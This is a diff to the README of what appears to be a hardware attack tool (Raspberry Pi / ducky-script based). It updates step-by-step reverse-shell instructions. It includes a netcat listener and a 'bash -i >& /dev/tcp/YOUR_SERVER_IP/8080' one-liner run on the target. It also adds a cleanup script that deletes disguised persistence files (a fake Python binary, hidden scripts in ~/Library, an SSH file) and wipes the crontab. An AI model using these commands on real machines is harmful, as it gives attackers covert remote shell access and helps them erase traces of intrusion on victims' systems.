@@ -56,16 +56,22 @@ ssh pi@172.16.0.1
 ```shell
 nc -l -p 8080 -vvv
 ```
-2. Create a descriptor on target machine. Make sure to change the IP address to your server. Your server must be in the same network as target unless you have a public IP that can be accessed by target machine everywhere. \(Run the descriptor in background is recommended.\)
+2. Create a descriptor on target machine. Make sure to change the IP address and port to your server. Your server must be in the same network as target unless you have a public IP that can be accessed by target machine everywhere. \(Run the descriptor in background is recommended.\)
 ```shell
-exec 5<>/dev/tcp/YOUR_SERVER_IP/8080
-cat <&5 | while read line; do $line 2>&5 >&5; done
+bash -i >& /dev/tcp/YOUR_SERVER_IP/8080 0>&1
 ```
 3. On your server, when you see a connection being created, you then have bash access to the target machine. You would be able to see the output of bash directly on your machine with the setup above.
+4. In [payloads/](./payloads/) there is a reverse shell ducky script example. Here is the clean up script if you use my example.
+```shell
+rm ~/app_support.sh; rm /tmp/app_support.sh; rm ~/.ssh/ras_pub_; rm ~/Library/.hidden/app_support.sh; rm ~/Library/Python3.65; rm /usr/local/bin/Python3.65;
+echo "" | crontab - && crontab -r
+```
 
-## Author
+## Author and Contributors
 
-**[Brian Sung](https://github.com/ohbriansung)** 
+* **[Brian Sung](https://github.com/ohbriansung)** 
+* Jordan Aldujaili
+* Omar Sharif
 
 ## Disclaimer
 
